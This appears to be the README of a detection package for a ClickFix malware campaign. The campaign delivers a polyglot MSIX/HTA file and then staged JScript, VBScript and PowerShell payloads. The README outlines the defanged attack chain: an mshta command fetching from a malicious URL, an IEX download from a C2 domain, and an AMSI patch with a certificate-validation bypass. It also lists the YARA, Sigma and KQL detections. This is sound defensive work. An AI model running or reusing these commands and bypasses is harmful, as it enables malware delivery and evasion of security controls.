# prism-vertex-clickfix

Blog post: https://blueteam.cool/posts/prism-vertex-clickfix/

## Summary

A ClickFix campaign serving a 2.4 MB polyglot file from `prism-vertex[.]com`
that disguises itself as a Microsoft MSIX package but parses as an HTA when
`mshta.exe` opens it. Four obfuscation layers (JScript -> VBScript ->
PowerShell -> PowerShell) with IE COM process laundering and an RC4-wrapped
AMSI bypass. The fifth-stage payload was not captured.

```
powershell.exe (interactive -- user types mshta.exe URL via ClickFix lure)
  -> mshta.exe hxxps://prism-vertex[.]com/8761886 (Stage 1)
    -> 2.4 MB polyglot ZIP+HTA (decoy name: WidgetsPlatformRuntime-ARM64.msix)
      -> Stage 2: JScript (LCG-XOR stream cipher, 23 kB ciphertext)
        -> Stage 3: VBScript via window.execScript()
          -> IE COM moniker (CLSID 9BA05972-...) -> ShellExecute PowerShell
            -> powershell.exe (parented to iexplore.exe, hidden, -EncodedCommand)
              -> Stage 4: RC4 decrypt reflection strings -> AMSI patch (0x41414141)
                -> IEX hxxps://creativecommunityinfo[.]art/Cat-<UUID> (Stage 5 -- NOT CAPTURED)
```

Full analysis: https://blueteam.cool/posts/prism-vertex-clickfix/

## What is included

| File | Description |
|---|---|
| `iocs.csv` | 12 indicators: hashes (x2), URLs (x2), domains (x2), filenames (x2), RC4 key, LCG constants, AMSI patch value, per-host ID algorithm |
| `rule.yar` | YARA: polyglot on disk + decrypted PowerShell stage + cleartext C2 strings |
| `sigma-mshta-url.yml` | Sigma: mshta.exe invoked with HTTP/HTTPS URL argument (process_creation) |
| `sigma-ps-amsi-bypass.yml` | Sigma: PowerShell AMSI bypass via amsiContext WriteInt32 (ps_script / EID 4104) |
| `kql.md` | KQL queries for Microsoft Sentinel and Defender XDR (6 queries) |

## Coverage notes

**What these detections cover:**

- `mshta.exe` invoked with any HTTP/HTTPS argument (near-zero false positives)
- PowerShell Script Block Logging content containing both `amsiContext` and
  `WriteInt32` (captures the bypass before AMSI is patched)
- `powershell.exe` parented to `iexplore.exe` (IE COM laundering anomaly)
- The polyglot file on disk (YARA: ZIP magic + decoy filenames + JScript decoder)
- The decrypted PowerShell stage if it lands on disk (YARA: RC4 key + glob pattern)
- Both C2 domains via network telemetry
- RC4 key string pivot across all log sources

**What these detections do NOT cover:**

- The originating ClickFix lure page (URL not captured in available telemetry;
  the user was observed typing the mshta.exe command directly)
- Stage 5 payload capabilities (the payload at `creativecommunityinfo[.]art`
  is operator-controlled and was not fetched during analysis; final-stage
  capabilities are unknown)
- The in-memory JScript and VBScript stages (they never touch disk; only the
  initial polyglot file is YARA-detectable)
- Wildcard PowerShell path obfuscation (`gi C:\W*\S*4\...`) via command-line
  search alone -- the glob resolves to a legitimate binary; detect via parent
  process or Script Block content instead

## False-positive notes

- `sigma-mshta-url.yml`: False positives are essentially unknown in modern
  enterprise environments. `mshta.exe` invoked against an external URL has no
  legitimate production use. The only expected FP source is security researchers
  or red teams testing LOLBIN coverage.

- `sigma-ps-amsi-bypass.yml`: Security tooling that tests AMSI health in-process
  could trigger this. In practice this is extremely rare in production. Scope
  exceptions to known security tooling hosts if needed.

- `rule.yar` polyglot condition: The `$decoy_msix` and `$decoy_splash` strings
  could theoretically match a real MSIX package, but the combined condition
  (ZIP magic + both decoy names + JScript decoder string) is highly specific.
  The RC4 key and wildcard PowerShell glob conditions have no known false positives.

## Confidence

**High** for all four in-sample stages (JScript, VBScript, both PowerShell layers).

The full decode chain was traced from the polyglot entry point through to the
AMSI bypass and second-stage `IEX`. All in-sample IOCs (SHA256, MD5, RC4 key,
LCG constants, C2 domains, per-host ID algorithm, AMSI patch value) were directly
observed in cleartext or decoded analysis.

**Note on Stage 5:** The payload served from `creativecommunityinfo[.]art` was
not captured. The URL shape, the per-host fingerprint algorithm, and the
`[ServicePointManager]::ServerCertificateValidationCallback = { $true }` pattern
confirm a second-stage download, but the payload content and final-stage
capabilities are unknown. Detection for Stage 5 is network-layer only (domain
block + URL pattern).

## Related detections

- [rule.yar](rule.yar) -- polyglot + PowerShell stage YARA
- [sigma-mshta-url.yml](sigma-mshta-url.yml) -- mshta URL execution
- [sigma-ps-amsi-bypass.yml](sigma-ps-amsi-bypass.yml) -- AMSI bypass
- [kql.md](kql.md) -- Microsoft Sentinel / Defender XDR queries
- [iocs.csv](iocs.csv) -- all indicators
